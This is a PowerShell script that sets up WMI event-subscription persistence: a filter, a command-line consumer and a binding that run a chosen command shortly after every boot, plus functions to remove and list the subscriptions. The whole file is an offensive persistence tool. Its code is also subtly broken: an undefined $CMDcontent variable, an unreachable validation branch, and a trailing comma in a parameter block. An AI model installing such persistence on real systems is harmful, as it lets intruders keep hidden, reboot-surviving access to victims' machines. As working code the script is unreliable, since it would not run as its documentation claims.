<#

Invoke-WMIPersist is used to create a WMI Event subscription for persistence. 
This is designed for Powershell 2.0 as no New-CIMInstance calls are made.


#>

#Requires -Version 2

function Invoke-WMIpersist
{
<#
.SYNOPSIS

Creates a WMI Event subscription that triggers 120 seconds after bootup.

.DESCRIPTION

Create a WMI Event subscription that triggers 120 seconds after bootup.

.PARAMETER CMD

Specify the executable you want to load or the path to the file used as input

.PARAMETER Type

Specify the executable you want to load or the path to the file used as input

.PARAMETER EventName

Specify the name of the WMI event.

.EXAMPLE

Invoke-WMIpersist -Type CMD -CMD Notepad.exe -EventName NotePad4Life

#>

    Param(
        [Parameter(Mandatory=$True)]
        [string]$CMD,

        [Parameter(Mandatory=$True)]
        [ValidateScript({
            If ($_ -eq 'CMD' -Or $_ -eq 'CMDFile' ) {
                $True
            }
            Elseif ($_ -eq 'CMDFile') {
            	$CMD = [IO.File]::ReadAllText("$CMD")
            }
            else {
                Throw "$_ is not a valid -Type. Use CMD or CMDFile"
            }
        })]
        [string]$Type,

        [Parameter(Mandatory=$True)]
        [string]$EventName
    )
   
$FilterArgs = @{
				Name = $EventName
                EventNameSpace = 'root\cimv2'
                QueryLanguage = "WQL"
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 210"}
$Filter=Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
				Name = $EventName
                CommandLineTemplate=$CMDcontent;}
$Consumer=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter
Consumer = $Consumer
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

}


function Invoke-WMICleanup
{
<#
.SYNOPSIS

Deletes a specified WMI Event subscription based on $EventName.


.DESCRIPTION

Deletes a specified WMI Event subscription based on $EventName.

.PARAMETER EventName

Specify the event name you want to remove.

.EXAMPLE

Invoke-WMICleanup -EventName NotePad4Life -EventType CommandLineEventConsumer
Invoke-WMICleanup -EventName NotePad4Life -EventType ActiveScriptEventConsumer

#>
    Param(
        [Parameter(Mandatory=$True)]
        [string]$EventName,
        [Parameter(Mandatory=$True)]
        [string]$EventType,
    )

$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class $EventType -Filter "Name = '$EventName'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventName'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject

}

function GetEvents
{
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter
}